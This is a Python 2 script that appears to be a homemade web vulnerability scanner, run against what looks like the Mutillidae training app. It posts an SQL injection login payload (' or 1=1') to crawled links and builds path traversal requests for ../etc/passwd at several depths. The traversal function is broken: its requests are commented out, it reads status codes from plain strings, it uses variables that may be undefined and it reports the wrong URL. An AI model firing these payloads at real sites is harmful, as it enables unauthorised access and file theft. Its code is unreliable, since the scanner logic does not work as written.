import urllib
import urlparse
import urllib2
import re


def read_file(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:
        #print(line)
        sql_inject(name, line)


def sql_inject(name, link):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    print("Starting SQL Injection....")

    errors = ["MySQl", "error in your SQL"]

    print("[-] Testing Errors: "+link)
    data = urllib.urlencode({"username": "' or 1=1'", "password": "' or 1=1'"})
    request = urllib.urlopen(link, data)
    page = request.read()

    newfile = root_folder + "/" + name + "/" + "sqli.txt"

    for x in errors:
        if x in page:
            g = open(newfile, 'w')

            g.write(
                "\033[01;31mVulnerability Found in: \033[00m\n"
                "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
            )


def path_traversal(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:
        if "page=" in line:
            page = "page=".join(line.split("page=")[:-1])
            print(page)

            q1 = page+"page=../etc/passwd"
            #request = urllib.urlopen(q1)
            if q1.code != 200:
                q2 = page + "page=../../etc/passwd"
                # request = urllib.urlopen(q2)
            else:
                print("\033[01;31m[*] Path Traversal Found : " + q1 + "\033[00m\n")

            if q2.code != 200:
                q3 = page + "page=../../../etc/passwd"
                # request = urllib.urlopen(q3)
            else:
                print("\033[01;31m[*] Path Traversal Found : " + q2 + "\033[00m\n")

            if q3 != 200:
                q4 = page + "page=../../../../etc/passwd"
                # request = urllib.urlopen(q4)
            else:
                print("\033[01;31m[*] Path Traversal Found : " + q3 + "\033[00m\n")

            if q4 != 200:
                print("[-] Path Traversal Not Found :")
            else:
                print("\033[01;31m[*] Path Traversal Found : " + q3 + "\033[00m\n")

path_traversal("MUTILLIDAE")